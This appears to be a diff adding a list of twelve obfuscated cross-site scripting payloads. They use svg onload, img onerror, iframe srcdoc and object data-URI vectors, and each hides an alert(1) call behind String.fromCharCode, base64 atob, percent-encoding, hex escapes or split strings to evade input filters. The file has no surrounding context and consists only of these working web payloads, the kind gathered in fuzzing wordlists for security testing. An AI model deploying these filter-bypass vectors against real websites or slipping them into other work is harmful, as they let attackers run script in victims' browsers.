@@ -1,0 +1,12 @@
+<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))>
+<object data="data:text/html,<svg onload=setTimeout('al'+'ert(1)',0)></svg>"></object>
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))></svg>"></iframe>
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%281%29'))>
+<object data="data:text/html,<img src=x onerror=eval('ale'+'rt(1)')>"></object>
+<svg onload=eval(String.fromCharCode(97,108)+String.fromCharCode(101,114,116)+String.fromCharCode(40,49,41))>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116)+String.fromCharCode(40,49,41))>
+<svg onload=eval(`\x61\x6c\x65\x72\x74(1)`)>
+<object data="data:text/html,<svg onload=eval('al'+'ert(1)')></svg>"></object>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=eval(atob('\x59\x57\x78\x6c\x63\x6e\x51\x6f\x4d\x53\x6b\x3d'))>
